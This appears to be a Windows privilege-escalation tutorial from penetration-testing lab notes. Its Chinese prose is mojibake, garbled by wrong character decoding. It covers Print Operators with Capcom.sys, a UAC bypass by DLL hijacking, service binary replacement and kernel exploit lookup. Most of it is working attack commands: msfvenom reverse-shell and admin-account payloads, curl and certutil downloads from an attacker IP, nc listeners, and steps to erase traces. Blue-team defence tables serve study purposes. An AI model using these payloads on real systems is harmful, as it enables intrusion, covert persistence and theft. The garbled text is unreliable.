‰ΩÜ Windows Áµ¶‰ªñÂÄëÁöÑÊ¨äÈôê„ÄåË∂ÖÂá∫Êú¨ÂàÜ„Äç‚Ä¶ üò±\
Âè™Ë¶ÅÊàêÁÇ∫ Print OperatorsÔºåÂ∞±ËÉΩÂä†ËºâÈ©ÖÂãï„ÄÅÂïüÂãïÁ≥ªÁµ±ÊúçÂãôÔºå\
ÈÄ≤‰∏ÄÊ≠•ÊãøÂà∞ SYSTEM Ê¨äÈôê üíÄ

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñ

```
[1Ô∏è‚É£ Áç≤Âèñ Print Operators Ê¨äÈôêÂ∏≥ËôüÔºàÈá£È≠ö / Hash ÊçïÁç≤Ôºâ]  
    ‚îÇ  
    ‚Üì  
[2Ô∏è‚É£ Á¢∫Ë™çÊòØÂê¶ÂÖ∑Êúâ SeLoadDriverPrivilegeÔºàwhoami /privÔºâ]  
    ‚îÇ  
    ‚Üì  
[3Ô∏è‚É£ ‰ΩøÁî® Capcom.sys ÊºèÊ¥ûÈ©ÖÂãïÊ∫ñÂÇôÊèêÊ¨ä]  
    ‚îÇ  
    ‚Üì  
[4Ô∏è‚É£ Âä†ÂÖ•Ë®ªÂÜäË°®ÊåáÂêëÊºèÊ¥ûÈ©ÖÂãïÔºàreg addÔºâ]  
    ‚îÇ  
    ‚Üì  
[5Ô∏è‚É£ ÂïüÁî® SeLoadDriverPrivilegeÔºàÂü∑Ë°å EnableSeLoadDriverPrivilegeÔºâ]  
    ‚îÇ  
    ‚Üì  
[6Ô∏è‚É£ ‰ΩøÁî® ExploitCapcom.exe Âü∑Ë°å ShellcodeÔºåÊãøÂà∞ SYSTEM Ê¨äÈôê]  
    ‚îÇ  
    ‚Üì  
[7Ô∏è‚É£ SYSTEM Ê¨äÈôê‰∏ã Dump Hash / Pass-the-Hash Ê©´ÂêëÁßªÂãï]  
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

#### ‚úÖ Á¨¨‰∏ÄÊ≠•ÔºöÁ¢∫Ë™çÊ¨äÈôê

```powershell
whoami /priv
```

Á¢∫Ë™ç SeLoadDriverPrivilege ÊòØÂê¶Â≠òÂú®ÔºàÈõñÁÑ∂È†êË®≠ÊòØ DisabledÔºå‰ΩÜÊàëÂÄëÂèØ‰ª•ÈÄèÈÅéÁπûÈÅéÊñπÂºèÂïüÁî®Ôºâ„ÄÇ

***

#### ‚úÖ Á¨¨‰∫åÊ≠•Ôºö‰∏ãËºâ‰∏¶Ë®≠ÂÆöÊºèÊ¥ûÈ©ÖÂãï

Âü∑Ë°å `EoPLoadDriver.exe` ‰ª•ÂïüÁî® `SeLoadDriverPrivilege` Ê¨äÈôêÔºåÂª∫Á´ãË®ªÂÜäË°®È†ÖÔºå‰∏¶Âü∑Ë°å `NTLoadDriver` Ôºö

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

ÊàñËÄÖÊâãÂãïÂª∫Á´ãË®ªÂÜäË°®

```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

Ë®≠ÂÆö NT Object Path ÊåáÂêëÊºèÊ¥ûÈ©ÖÂãïÊ™îÊ°à„ÄÇ

***

#### ‚úÖ Á¨¨‰∏âÊ≠•ÔºöÂü∑Ë°å `ExploitCapcom.exe`&#x20;

ÈúÄË¶ÅÊñá‰ª∂‰∏äÂÇ≥&#x20;

```powershell
ExploitCapcom.exe
```

ÈÄôÂ∞áÂïüÂãïÂÖ∑ÊúâÁ≥ªÁµ±Ê¨äÈôêÁöÑÂëΩ‰ª§ÊèêÁ§∫Á¨¶ÔºåÂõ†Ê≠§ÔºåÂ≠∏ÁîüÁèæÂú®ÂèØ‰ª•ËÆÄÂèñÁõÆÈåÑ `C:\Users\Administrator\Desktop` ‰∏ãÁöÑÊ®ôË™åÊ™îÊ°à‚Äúflag.txt‚ÄùÔºåÂç≥ `Pr1nt_0p3rat0rs_ftw!` Ôºö

***

#### ‚úÖ Á¨¨ÂÖ≠Ê≠•ÔºöÈÄ≤Ë°åÊ©´ÂêëÁßªÂãï

Âà©Áî® CrackMapExec Êàñ Mimikatz Dump Âá∫ÂÖ∂‰ªñ‰∏ªÊ©ü NTLM HashÔºåÈÄ≤‰∏ÄÊ≠•Ê©´ÂêëÁßªÂãïËàáÂüüÊéßÊª≤ÈÄè„ÄÇ

***

### üí° ÈÄ≤ÈöéÊ®°Âºè

Ëã•ÁÑ°Ê≥ïÁõ¥Êé•ÈñãÂïü GUIÔºåÂèØ‰ª•ÊîπÂØ´ ExploitCapcom Á®ãÂºèÁ¢ºÔºå\
Â∞áÂéüÊú¨ÁöÑ `cmd.exe` ÊîπÊàêÂèçÂêë Shell Payload Ë∑ØÂæëÔºå‰æãÂ¶ÇÔºö

```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

ÁÑ∂ÂæåÊê≠ÈÖç listener ÂèñÂæóÂèçÂêëÈÄ£Á∑öÔºÅ

***

### ‚ö†Ô∏è ËóçÈöäÈò≤Á¶¶Âª∫Ë≠∞

| Èò≤Á¶¶Êé™ÊñΩ                                          | ÂéüÂõ†                    |
| --------------------------------------------- | --------------------- |
| ‚úÖ Âö¥Ê†ºÂØ©Êü• Print Operators ÊàêÂì°                     | Áµï‰∏çËÆìÈùûÂøÖË¶ÅÂ∏≥ËôüÈÄ≤ÂÖ•Ê≠§Áæ§ÁµÑ         |
| ‚úÖ ÂÅµÊ∏¨ reg add HKCU\System\CurrentControlSet Êìç‰Ωú | Âª∫Á´ã SIEM Ë¶èÂâáÁõ£ÊéßÁï∞Â∏∏Ë®ªÂÜäË°®‰øÆÊîπË°åÁÇ∫ |
| ‚úÖ ÂÅúÁî®‰∏çÂøÖË¶ÅÊúçÂãô / Ê∏õÂ∞ëÂèØÂà©Áî®ÊúçÂãô                           | Èôç‰ΩéË¢´ÊîπÂØ´Âü∑Ë°åË∑ØÂæëÁöÑÊîªÊìäÈù¢         |
| ‚úÖ Ê™¢Êü•Á≥ªÁµ±‰∏≠‰∏çÊáâÂ≠òÂú®ÁöÑÊºèÊ¥ûÈ©ÖÂãï (Â¶Ç Capcom.sys)               | ÂÆöÊúü‰∏ªÂãïÊéÉÊèèÈ©ÖÂãïÂÆâÂÖ®ÊÄß           |
| ‚úÖ AppLocker Á¶ÅÊ≠¢ÈùûÁ∞ΩÁ´†È©ÖÂãïËºâÂÖ•                         | Ê∏õÂ∞ëÊÉ°ÊÑèÈ©ÖÂãïÊ≥®ÂÖ•ÁöÑÂèØËÉΩÊÄß          |

</details>

<details>

<summary>User Account ControlÔºàUACÔºâÁπûÈÅé</summary>

***

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµÔºàUAC ÊòØ‰ªÄÈ∫ºÔºâ

UACÔºà‰ΩøÁî®ËÄÖÂ∏≥Êà∂ÊéßÂà∂ÔºâÂ∞±ÂÉèÊòØ**ÂÖ¨Âè∏ IT ÂÆâÂÖ®ÈÉ®ÈñÄÁöÑÂØ©Ê†∏Ê©üÂà∂**Ôºå\
Áï∂‰Ω†Ë¶ÅÂÅö‰∏Ä‰ª∂È´òÊ¨äÈôêÔºà‰æãÂ¶ÇÔºöÊñ∞Â¢ûÂ∏≥Ëôü„ÄÅ‰øÆÊîπÁ≥ªÁµ±Ë®≠ÂÆöÔºâË°åÁÇ∫ÊôÇÔºå\
Á≥ªÁµ±ÊúÉË∑≥Âá∫Ôºö„ÄåË´ãÂïè‰Ω†Á¢∫ÂÆöË¶ÅÂêåÊÑèÂóéÔºü„Äç\
üëâ ‰ΩÜÊòØÔºå\
ÊîªÊìäËÄÖÂè™Ë¶ÅÊâæÂá∫**Windows È†êË®≠ÊúÉËá™Âãï‰ø°‰ªªÁöÑÁ≥ªÁµ±Á®ãÂºè**Ôºå\
ËÆìÂÆÉÂéª„ÄåÈñìÊé•„ÄçÂü∑Ë°åÊîªÊìäËÄÖÁöÑ DLLÔºå\
UAC Â∞±Á≠âÊñºÊ≤í‰∫Ü‚Ä¶

***

### üå≥ ÊîªÊìäÊµÅÁ®ãÊ®πÁãÄÂúñ

```
[1Ô∏è‚É£ Á¢∫Ë™çÁõÆÊ®ôÁ≥ªÁµ±ÊòØÂê¶ÂïüÁî® UAC]
 ‚îî‚îÄ> REG QUERY HKEY_LOCAL_MACHINE\...\EnableLUA
     ‚îÇ
     ‚Üì
[2Ô∏è‚É£ Á¢∫Ë™ç UAC ÊèêÁ§∫Á≠âÁ¥ö]
 ‚îî‚îÄ> REG QUERY HKEY_LOCAL_MACHINE\...\ConsentPromptBehaviorAdmin
     ‚îÇ
     ‚Üì
[3Ô∏è‚É£ Êü•Ë©¢Á≥ªÁµ±ÁâàÊú¨Ëàá Build]
 ‚îî‚îÄ> PowerShell: [environment]::OSVersion.Version
     ‚îÇ
     ‚Üì
[4Ô∏è‚É£ Â∞çÁÖß UACMe ÊäÄË°ìË°®ÔºàÊâæÂá∫ÂèØÁî®ÊºèÊ¥ûÔºâ]
 ‚îî‚îÄ> ÈÅ∏ÂÆö Technique #54 (SystemPropertiesAdvanced.exe + DLL Âä´ÊåÅ)
     ‚îÇ
     ‚Üì
[5Ô∏è‚É£ Âà©Áî® msfvenom Âª∫Á´ãÊÉ°ÊÑè DLL]
 ‚îî‚îÄ> Ëº∏Âá∫ÁÇ∫ srrstr.dll (ÂèçÂêë shell)
     ‚îÇ
     ‚Üì
[6Ô∏è‚É£ ‰∏äÂÇ≥ÊÉ°ÊÑè DLL Ëá≥ÂèØÂØ´ÂÖ•ÁõÆÈåÑ]
 ‚îî‚îÄ> WindowsApps ÁõÆÈåÑ
     ‚îÇ
     ‚Üì
[7Ô∏è‚É£ ÂïüÂãï nc listener Êé•Êî∂ÂèçÂêëÈÄ£Á∑ö]
 ‚îî‚îÄ> nc -lvnp 8443
     ‚îÇ
     ‚Üì
[8Ô∏è‚É£ ÈÅ†Á´ØËß∏Áôº SystemPropertiesAdvanced.exe]
 ‚îî‚îÄ> ÈÄèÈÅé WinRM / RDP / local cmd Âü∑Ë°å
     ‚îÇ
     ‚Üì
[9Ô∏è‚É£ Êé•Êî∂Âà∞ SYSTEM Á≠âÁ¥öÊ¨äÈôêÂèçÂΩà shell]
```

***

### üîé ÊØè‰∏ÄÊ≠•Ë©≥Á¥∞Ê≠•È©üÔºã‰ª£Á¢ºÔºãËÉåÂæåÂéüÁêÜ

***

#### ‚úÖ Ê≠•È©ü 1ÔºöÁ¢∫Ë™ç UAC ÊòØÂê¶ÈñãÂïü

**ÁÇ∫‰ªÄÈ∫ºË¶ÅÂÅöÔºü**\
üëâ Â¶ÇÊûúÊ≤íÊúâÈñã UACÔºåÂ∞±‰∏çÈúÄË¶ÅÁπûÈÅéÔºåÁõ¥Êé•ÊèêÊ¨äÂç≥ÂèØ„ÄÇ

**Êåá‰ª§ÁØÑ‰æãÔºö**

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

* ÂõûÂÇ≥ `0x1` ‰ª£Ë°®ÂïüÁî®Ôºå`0x0` ‰ª£Ë°®Êú™ÂïüÁî®„ÄÇ

***

#### ‚úÖ Ê≠•È©ü 2ÔºöÁ¢∫Ë™ç UAC ÊèêÁ§∫Â±§Á¥ö

* `ConsentPromptBehaviorAdmin` ÁöÑÂÄºË™™ÊòéÔºö\
  \| ÂÄº | Ë°åÁÇ∫ | |------|-------------------------------------------------| | 0x0 | Ëá™ÂãïÊâπÂáÜÔºàÊúÄÂç±Èö™Ôºâ | | 0x2 | Âè™Ë¶ÅÁôªÂÖ•ÁÇ∫ adminÔºåÊâÄÊúâÂãï‰Ωú‰∏çÊèêÁ§∫ | | 0x5 | Always NotifyÔºàÊúÄÂÆâÂÖ®Ôºâ |

**ÁØÑ‰æãÊåá‰ª§Ôºö**

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

* Â¶ÇÊûúÊòØ `0x2` Êàñ `0x0`ÔºåÊÅ≠ÂñúÔºåÈùûÂ∏∏ÂÆπÊòìÂà©Áî®ÔºÅ

***

#### ‚úÖ Ê≠•È©ü 3ÔºöÊü• Windows ÁâàÊú¨

```powershell
[environment]::OSVersion.Version
```

* ÊâæÂà∞ `Major.Minor.Build`
* ÊØîÂ∞ç UACMe ÂèØÁî®ÊäÄË°ì (‰æãÂ¶Ç Technique #54 ÈÅ©Áî® 14393 build)

***

#### ‚úÖ Ê≠•È©ü 4ÔºöÂª∫Á´ãÊÉ°ÊÑè DLL

**ÁõÆÊ®ôÔºöË£Ω‰Ωú srrstr.dllÔºåË£°Èù¢Âü∑Ë°åÂèçÂêë shell„ÄÇ**\
**ÁØÑ‰æãÔºö**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll -o srrstr.dll
```

* **LHOST**Ôºö‰Ω†ÁöÑÊîªÊìäÊ©ü IP
* **LPORT**ÔºöË¶ÅÁõ£ËÅΩÁöÑ port
* Áî¢ÁîüÁöÑ `srrstr.dll` ÊúÉÂú®Ë¢´Âü∑Ë°åÊôÇÂòóË©¶Âª∫Á´ã TCP ÈÄ£Á∑ö„ÄÇ

***

#### ‚úÖ Ê≠•È©ü 5ÔºöÂú®ÂèóÂÆ≥‰∏ªÊ©ü‰∏ãËºâÊÉ°ÊÑè DLL

```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

* **ÁÇ∫‰ªÄÈ∫ºÊîæ WindowsAppsÔºü**\
  üëâ Âõ†ÁÇ∫ WindowsApps Ë≥áÊñôÂ§æÂú® PATH ÂÖßÔºåÁ®ãÂºèÊêúÂ∞ã DLL ÊôÇÊúÉÂÑ™ÂÖàÊâæÊ≠§Ëôï„ÄÇ

***

#### ‚úÖ Ê≠•È©ü 6ÔºöÂú®ÊîªÊìäÁ´ØÈñã listener

```bash
nc -lvnp 8443
```

* Á≠âÂæÖÂèóÂÆ≥ËÄÖÂü∑Ë°åÊôÇÂèçÈÄ£Âõû‰æÜ„ÄÇ

***

#### ‚úÖ Ê≠•È©ü 7ÔºöËß∏ÁôºÊºèÊ¥û

**Âú®ÂèóÂÆ≥Ê©ü‰∏äÂü∑Ë°åËá™ÂãïÊèêÂçáÁ®ãÂºè**

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

* Ê≠§Á®ãÂºèÊúÉÂòóË©¶ËºâÂÖ• `srrstr.dll`ÔºåÂ∞±ÊúÉ‰∏çÁ∂ìÂêåÊÑèÊèêÁ§∫Âü∑Ë°åÊàëÂÄëÁöÑ DLLÔºÅ

***

#### ‚úÖ Ê≠•È©ü 8ÔºöÊé•Êî∂ÂèçÂΩà shell

Âú®‰Ω†ÁöÑ nc Ë¶ñÁ™óÊúÉÁúãÂà∞Ôºö

```
connect to [10.10.14.3] from (UNKNOWN) [victim IP]
Microsoft Windows [Version 10.xxxxx]
C:\Windows\system32>
```

ÁÑ∂Âæå‰Ω†Â∞±ÊìÅÊúâ SYSTEM Á≠âÁ¥ö shell üéâ



### üõ† Â¶ÇÊûú Debug Âá∫ÈåØÊÄéÈ∫ºËæ¶Ôºü

* **Ê≤íÊúâÂèçÂΩàÔºü**
  * Á¢∫Ë™çÈò≤ÁÅ´ÁâÜÊúâÊ≤íÊúâÊìã‰Ωè port
  * Á¢∫Ë™ç LHOST Ë®≠Â∞çÔºà‰∏çËÉΩË®≠ÈåØÁ∂≤Âç° IPÔºâ
  * Á¢∫Ë™ç victim ÂèØ‰ª• ping Âà∞‰Ω†ÁöÑ LHOST
* **Âü∑Ë°åÂæå DLL Ê≤íË¢´ÂëºÂè´Ôºü**
  * Á¢∫Ë™ç DLL ÂêçÁ®±ÊòØÂê¶Ê≠£Á¢∫ `srrstr.dll`
  * Á¢∫Ë™çÊîæÂú®ÊúâÂØ´ÂÖ•Ê¨äÈôê‰∏î PATH Ë£°ÁöÑË≥áÊñôÂ§æ
* **nc Ê≤íÊé•Âà∞Ôºü**
  * Ê™¢Êü• listener port
  * ÊîπÁî®ÂÖ∂‰ªñ portÔºå‰æãÂ¶Ç 53 / 443 ÊØîËºÉÂÆπÊòìÈÄöÈÅéÈò≤ÁÅ´ÁâÜ

***

### ‚ö† ËóçÈöäÈò≤Á¶¶Âª∫Ë≠∞

| Èò≤Á¶¶Êé™ÊñΩ                                   | ÂéüÂõ†                    |
| -------------------------------------- | --------------------- |
| ÊèêÈ´ò UAC Ë®≠ÂÆöÔºàË®≠ÁÇ∫ 0x5Ôºâ                      | ÈÅøÂÖçËºÉ‰ΩéÂ±§Á¥öÂÆπÊòìË¢´ÁπûÈÅé           |
| ÈôêÂà∂ PATH ÂèØÂØ´Ë∑ØÂæë                           | Èò≤Ê≠¢ DLL Âä´ÊåÅ             |
| Áõ£Êéß `SystemPropertiesAdvanced.exe` ÂïüÂãï‰∫ã‰ª∂ | ÈùûÊ≠£Â∏∏ÊôÇÈñìÂïüÂãïÊ≠§Á®ãÂºèÂèØÁñëÂ∫¶Ê•µÈ´òÔºåÂèØÈÄ≤Ë°åÂëäË≠¶ |
| ‰ΩøÁî® AppLocker ÈôêÂà∂ DLL Âä†Ëºâ                 | Á¶ÅÊ≠¢Êú™Á∞ΩÁ´† DLL Ë¢´Á≥ªÁµ±Ëá™ÂãïÂä†Ëºâ     |

</details>

<details>

<summary>Âº±Ê¨äÈôêÊèêÊ¨äÊîªÊìä</summary>

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµÔºö

> „ÄåÂº±Ê¨äÈôê„ÄçÂú® Windows Áí∞Â¢ÉÂ∞±ÂÉèÂÖ¨Âè∏Ë£°Èù¢Ôºö

* ÈáçË¶ÅË≥áÊ∫êÔºàÊúçÂãô„ÄÅÂü∑Ë°åÊ™î„ÄÅÁôªÈåÑÊ™îÔºâË¢´Ë®≠ÂÆöÁÇ∫„Äå‰ªª‰Ωï‰∫∫ÈÉΩÂèØ‰ª•‰øÆÊîπ ‚úèÔ∏è„Äç
* ÊîªÊìäËÄÖ‰∏ÄÊó¶ÂèñÂæó‰ΩéÊ¨äÈôêÂ∏≥ËôüÔºåÂ∞±ÂèØ‰ª•„ÄåÂÅ∑ÂÅ∑Êõ¥Êîπ„ÄçÈÇ£‰∫õÈ´òÊ¨äÈôêÊúçÂãôÂü∑Ë°åÁöÑÊ™îÊ°àÊàñË∑ØÂæëÔºåËÆì‰∏ãÊ¨°ÊúçÂãôÂïüÂãïÊôÇÁõ¥Êé•Âπ´‰Ω†Âü∑Ë°åÊÉ°ÊÑè‰ª£Á¢º„ÄÇ
* ÈÄöÂ∏∏ÁôºÁîüÂú®Â∞èÂÖ¨Âè∏Ëá™Â∑±ÂØ´ÁöÑÊúçÂãô„ÄÅÁ¨¨‰∏âÊñπÈñãÊ∫êËªüÈ´îÊàñÊ≤íÁ∂ìÈÅéÂö¥Ê†ºÊ™¢Êü•ÁöÑÂÆâË£ùÁ®ãÂºè„ÄÇ

***

### üå≥ Âº±Ê¨äÈôêÊèêÊ¨äÊîªÊìäÊµÅÁ®ãÊ®π

```
[1Ô∏è‚É£ Á¢∫Ë™çÁ≥ªÁµ±Â≠òÂú®Âº±Ê¨äÈôêÂïèÈ°å]
 ‚îú‚îÄ> ‰ΩøÁî® SharpUp.exe ÊéÉÊèè
 ‚îú‚îÄ> ‰ΩøÁî® icacls / accesschk ÊâãÂãïÊ™¢Êü•
     ‚îÇ
     ‚Üì
[2Ô∏è‚É£ ÁôºÁèæÂèØ‰øÆÊîπÁöÑÊúçÂãô‰∫åÈÄ≤‰ΩçË∑ØÂæë / Registry Ê¨äÈôê]
 ‚îú‚îÄ> Ë§áË£ΩÂéüÊú¨Ê™îÊ°àÂÇô‰ªΩ
 ‚îú‚îÄ> Áî¢ÁîüÊÉ°ÊÑè Payload (msfvenom or Ëá™Ë®Ç .exe)
 ‚îú‚îÄ> Ë¶ÜËìãÂà∞ÊúçÂãôÂü∑Ë°åÊ™îÊàñÊîπ binpath ÁÇ∫ÊÉ°ÊÑèÊåá‰ª§
     ‚îÇ
     ‚Üì
[3Ô∏è‚É£ ÂÅúÊ≠¢ÊúçÂãô‰∏¶ÈáçÊñ∞ÂïüÂãï]
 ‚îî‚îÄ> ÊîªÊìäËÄÖÁç≤Âæó SYSTEM Ê¨äÈôêÊàñÂ∞áËá™Â∑±Âä†ÂÖ• Administrators Áæ§ÁµÑ
     ‚îÇ
     ‚Üì
[4Ô∏è‚É£ Ê∏ÖÁêÜÁèæÂ†¥]
 ‚îú‚îÄ> Â∞á binpath ÊîπÂõûÂéüÊú¨Ë®≠ÂÆö
 ‚îî‚îÄ> Âà™Èô§ÊÉ°ÊÑèÂü∑Ë°åÊ™îËàáÊ≠∑Âè≤Á¥ÄÈåÑ
```

***

### üîé ÂØ¶Êà∞Á§∫ÁØÑÔºàÂÆåÊï¥ÁØÑ‰æãÔºâ

#### ‚úÖ Á¨¨‰∏ÄÊ≠•ÔºöÊéÉÊèèÂº±Ê¨äÈôê

```powershell
.\SharpUp.exe audit
```

* Êâæ `Modifiable Service Binaries`„ÄÅ`Modifiable Services` Êàñ `Modifiable Registry Keys`

***

#### ‚úÖ Á¨¨‰∫åÊ≠•ÔºöÁî® icacls Ê™¢Êü•ÊúçÂãôÂü∑Ë°åÊ™îÊ¨äÈôê

```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

* Â¶ÇÊûúÁúãÂà∞ Everyone:(F) Êàñ Users:(F) Ë°®Á§∫‰ªª‰Ωï‰∫∫ÂèØÂØ´ÂÖ•ÔºÅÈùûÂ∏∏Âö¥Èáç‚ö†

***

#### ‚úÖ Á¨¨‰∏âÊ≠•ÔºöÁî¢ÁîüÊÉ°ÊÑè Payload

> ÁõÆÊ®ôÔºöÈÄèÈÅéÂèçÂêë Shell ÊàñÂä†Â∏≥Ëôü

**üõ† ÂèçÂêë shell ÁØÑ‰æãÔºö**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.80 LPORT=4444 -f exe > SecurityService.exe
```

**üõ† Ëá™ÂãïÊñ∞Â¢ûÂ∏≥ËôüÁØÑ‰æãÔºàexe payloadÔºâÔºö**

```bash
msfvenom -p windows/x64/exec CMD="net user pentest P@ssw0rd! /add && net localgroup Administrators pentest /add" -f exe -o adduser.exe
```

***

‚úÖ ÂïüÂãï‰∏ÄÂÄã Python HTTP ‰º∫ÊúçÂô®



```shell-session
python3 -m http.server 8080
```

#### ‚úÖ Á¨¨ÂõõÊ≠•ÔºöÁî® `certutil.exe` Â∞áÊÉ°ÊÑè `.exe` Ê™îÊ°à‰∏ãËºâÂà∞ Windows Ê©üÂô®‰∏ä

**‚û°**

```cmd-session
certutil.exe -f -urlcache http://10.10.14.80:8080/SecurityService.exe SecurityService.exe

****  Online  ****
CertUtil: -URLCache command completed successfully.
```

\


***

#### ‚úÖ Á¨¨‰∫îÊ≠•ÔºöÂéüÂßãÊñá‰ª∂ `C:\Program Files (x86)\PCProtect\SecurityService.exe` ÊõøÊèõÁÇ∫ `msfvenom` Áî¢ÁîüÁöÑÊÉ°ÊÑèÂèØÂü∑Ë°åÊñá‰ª∂ÔºåÁÑ∂ÂæåÂïüÂãïÊúçÂãôÔºö

```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

***

#### ‚úÖ Á¨¨ÂÖ≠Ê≠•ÔºöÁ¢∫Ë™çÊèêÊ¨äÊàêÂäü

```cmd
net localgroup administrators
```

* Â¶ÇÊûúÁúãÂà∞‰Ω†ÁöÑÂ∏≥ËôüÔºàpentestÔºâÂú®Ë£°Èù¢ÔºåÂ∞±ÊòØÊàêÂäüÔºÅüéâ

***

### üõ† Debug ÊåáÂçó

| ÂïèÈ°å                    | Ê™¢Êü•È†ÖÁõÆ                                                             |
| --------------------- | ---------------------------------------------------------------- |
| ÂïüÂãïÊúçÂãôÊ≤íÊúâÂèçÊáâÊàñÊ≤íÂü∑Ë°å          | <p>1Ô∏è‚É£ binpath Ê†ºÂºèÊòØÂê¶Ê≠£Á¢∫Ôºü<br>2Ô∏è‚É£ ÊúâÁÑ°Áî® <code>sc start</code> ÈáçÂïüÊúçÂãô</p> |
| ÁÑ°Ê≥ïË§áË£ΩÊ™îÊ°àÊàñÊ¨äÈôêË¢´Êãí           | <p>Ê™¢Êü•Ê™îÊ°àÊ¨äÈôêÔºàicaclsÔºâÔºõ<br>Á¢∫‰øùÁõÆÈåÑÂíåÂü∑Ë°åÊ™îÁÇ∫ÂèØÂØ´</p>                            |
| Ê≤íÊúâÈ°ØÁ§∫Êñ∞Â∏≥Ëôü / ÂèçÂΩà shell Â§±Êïó | <p>Payload ÊòØÂê¶Ê≠£Á¢∫Ôºü<br>LHOST / LPORT Ë®≠ÂÆöÊúâÁÑ°ÈåØË™§</p>                     |
| AccessChk Êâæ‰∏çÂà∞ÊúçÂãô       | - Ë´ãÁ¢∫Ë™çÊ≠£Á¢∫ÁöÑÊúçÂãôÂêçÁ®±Ôºå‰∏¶Ê™¢Êü•ÊúçÂãôÁãÄÊÖã                                             |

</details>

<details>

<summary>Windows Kernel ExploitsÔºàÂÖßÊ†∏ÊºèÊ¥ûÊèêÊ¨äÔºâ</summary>

### üå≥ ÊîªÊìäÊµÅÁ®ãÊ®πÁãÄÂúñÔºàÊñáÂ≠óÁâàÔºâ



```
[1Ô∏è‚É£ Âà§Êñ∑Á≥ªÁµ±ÊòØÂê¶ÊúâÁº∫Èô∑]
 ‚îú‚îÄ> systeminfo / wmic / Get-Hotfix Êü•Áúã patch
 ‚îú‚îÄ> Google KBÁ∑®ËôüÂ∞çÁÖß CVE
 ‚îú‚îÄ> ‰ΩøÁî®ÊºèÊ¥ûÊü•Ë©¢Á∂≤Á´ô (exploit-db / rapid7 / msrc)
     ‚Üì
[2Ô∏è‚É£ Á¢∫Ë™çÂèØÂà©Áî®ÁöÑ CVE]
 ‚îú‚îÄ> ÊêúÂ∞ãË©≤Á≥ªÁµ±ÈÅ©Áî®ÁöÑ Kernel Exploit
 ‚îú‚îÄ> ‰∏ãËºâÂ∞çÊáâ exploit Á®ãÂºèÁ¢º
 ‚îú‚îÄ> Á∑®Ë≠ØÊàñÂèñÂæóÂèØÂü∑Ë°åÊ™î
     ‚Üì
[3Ô∏è‚É£ ÂòóË©¶Âà©Áî®]
 ‚îú‚îÄ> Êú¨Âú∞ÊèêÊ¨ä payload (Â¶Ç HiveNightmare / PrintNightmare)
 ‚îú‚îÄ> Âü∑Ë°åÊÉ°ÊÑè DLL / EXE
 ‚îú‚îÄ> Á≠âÂæÖÂΩàÂõû SYSTEM shell
     ‚Üì
[4Ô∏è‚É£ Á¢∫Ë™çÊèêÊ¨äÊàêÂäü]
 ‚îî‚îÄ> whoami / getuid / sysinfo Ê™¢Êü•
     ‚Üì
[5Ô∏è‚É£ Ê∏ÖÁêÜÁèæÂ†¥]
 ‚îú‚îÄ> Âà™Èô§Ê§çÂÖ•Ê™îÊ°à
 ‚îî‚îÄ> ÈÇÑÂéü‰øÆÊîπË®≠ÂÆö
```

####

#### 1Ô∏è‚É£ ÂÆâË£ù Python Áí∞Â¢ÉÔºàLinux ÊîªÊìäÊ©ü or Windows ÈÉΩÂèØÔºâ

üëâ Â¶ÇÊûúÂú® Kali Êàñ Parrot LinuxÔºö

```bash
sudo apt update
sudo apt install python3 python3-pip git
```

üëâ Â¶ÇÊûúÂú® WindowsÔºö

* ÂÆâË£ù Python 3 ([https://www.python.org/downloads/](https://www.python.org/downloads/))
* ‰∏¶Ë®òÂæóÂú®ÂÆâË£ùÊôÇÂãæÈÅ∏„ÄåAdd to PATH„Äç

***

#### 2Ô∏è‚É£ ÂÆâË£ù windows-exploit-suggester (WES) Â∑•ÂÖ∑

```bash
git clone https://github.com/bitsadmin/wesng.git
cd wesng
pip3 install -r requirements.txt
```

üîé **ÁÇ∫‰ªÄÈ∫ºÈÄôÊ®£ÂÅöÔºü**\
`wesng` ÊòØÁ∂ìÂ∏∏Êõ¥Êñ∞ÁöÑËá™ÂãïÂåñÂ∑•ÂÖ∑ÔºåÈÄèÈÅéÊØîÂ∞ç `systeminfo` ‰æÜÊâæÂá∫Á≥ªÁµ±ÊºèÊ¥û„ÄÇ

***

#### 3Ô∏è‚É£ Êõ¥Êñ∞ÊºèÊ¥ûË≥áÊñôÂ∫´ÔºàÂøÖË¶ÅÔºÅÔºâ

```bash
python3 wes.py --update
```

* ÊúÉ‰∏ãËºâÊúÄÊñ∞ `exploitdb.csv`
* Ëã•Âá∫ÁèæÈåØË™§ÔºåÈÄöÂ∏∏ÊòØÁ∂≤Ë∑ØÊàñ Proxy ÂïèÈ°åÔºåÊ™¢Êü•ÈÄ£Á∑ö

***

### 4Ô∏è‚É£ Windows Á´ØÔºöÊî∂ÈõÜÁ≥ªÁµ±‰ø°ÊÅØ

üëâ Âú®ÂèóÂÆ≥‰∏ªÊ©ü (Windows) ‰∏äÊâìÈñã `cmd`ÔºåÂü∑Ë°åÔºö

```cmd
systeminfo > C:\Temp\systeminfo.txt
wmic qfe list full > C:\Temp\qfe.txt
```

üîé ÁÇ∫‰ªÄÈ∫ºÔºö

* `systeminfo` Êèê‰æõÁ≥ªÁµ±Ë©≥Á¥∞Ë≥áË®ä
* `wmic qfe` Êèê‰æõÁÜ±‰øÆË£úÁ¥ÄÈåÑ

***

